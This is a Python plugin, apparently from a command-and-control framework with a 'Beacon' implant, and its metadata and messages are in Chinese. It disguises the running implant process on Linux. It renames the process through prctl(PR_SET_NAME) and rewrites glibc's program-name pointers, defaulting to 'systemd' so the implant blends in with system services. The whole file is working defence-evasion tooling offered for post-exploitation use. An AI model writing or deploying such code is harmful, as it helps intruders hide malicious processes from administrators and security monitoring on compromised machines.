"""Linux process masquerade: prctl comm name plus glibc program-name pointers."""
import ctypes
import os

PLUGIN = {
    "name": "Linux 进程伪装",
    "commands": ["lmasquerade"],
    "platform": "linux",
    "risk": "R1",
    "description": "修改当前 Beacon 进程的 prctl comm 名称，并尽力改写 glibc 的 __progname / program_invocation_name",
    "write_disk": False,
}

# Keep allocated replacement strings alive for the lifetime of the process.
_BUFFERS = []


def _replace_glibc_name(libc, symbol, value):
    try:
        pointer = ctypes.c_void_p.in_dll(libc, symbol)
        buffer = ctypes.create_string_buffer(value + b"\x00")
        pointer.value = ctypes.addressof(buffer)
        _BUFFERS.append(buffer)
    except Exception:
        pass


def run(runtime, args):
    if os.name == "nt":
        return {"error": "lmasquerade is Linux-only; use a Windows masquerade plugin on Windows"}

    requested = str((args or {}).get("new_name") or (args or {}).get("name") or "").strip()
    name = requested or "systemd"
    raw = name.encode("utf-8")
    comm = raw[:15]
    try:
        libc = ctypes.CDLL(None)
        prctl = libc.prctl
        prctl.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong]
        prctl.restype = ctypes.c_int
        rc = prctl(15, ctypes.c_char_p(comm), 0, 0, 0)
        if rc != 0:
            raise OSError(ctypes.get_errno(), "prctl(PR_SET_NAME) failed")
        # Best-effort libc-side names. prctl is the authoritative Linux comm
        # name; these pointers make error messages and glibc callers agree.
        _replace_glibc_name(libc, "__progname", comm)
        _replace_glibc_name(libc, "program_invocation_short_name", comm)
        _replace_glibc_name(libc, "program_invocation_name", raw)
        applied = comm.decode("utf-8", "replace")
        result = {
            "ok": True,
            "requested": name,
            "applied": applied,
            "truncated": len(raw) > 15,
        }
        runtime.emit(f"进程伪装已应用：{applied}" + ("（prctl 名称限制为 15 字节）" if result["truncated"] else ""))
        return result
    except Exception as exc:
        runtime.emit(f"进程伪装失败：{exc}")
        return {"ok": False, "error": str(exc), "requested": name}
